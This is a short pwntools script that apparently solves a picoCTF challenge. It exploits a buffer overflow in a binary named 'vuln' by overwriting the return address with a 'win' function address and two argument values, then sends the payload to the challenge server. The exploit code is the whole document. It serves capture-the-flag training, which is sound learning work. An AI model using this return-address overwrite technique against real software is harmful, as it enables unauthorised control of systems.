from pwn import *

# The function vuln is vulnerable to a buffer overflow attack.
# there is a fun win that takes two parameters 
# to get the flag par1 must be 0xcafef00d and par2 0xf00df00d

#con = process('./vuln')
con = connect('saturn.picoctf.net', 58859)

offset = 112 

win_addr = 0x08049296

# the payload is: padding + win_addr + dumb_ret_add_for_the_win_function + arg1 + arg2
payload = b'A' * offset + p32(win_addr) + b'B'*4 + p32(0xcafef00d) + p32(0xf00df00d)

open('payload', 'wb').write(payload)
con.sendlineafter(b':', payload)
con.interactive()

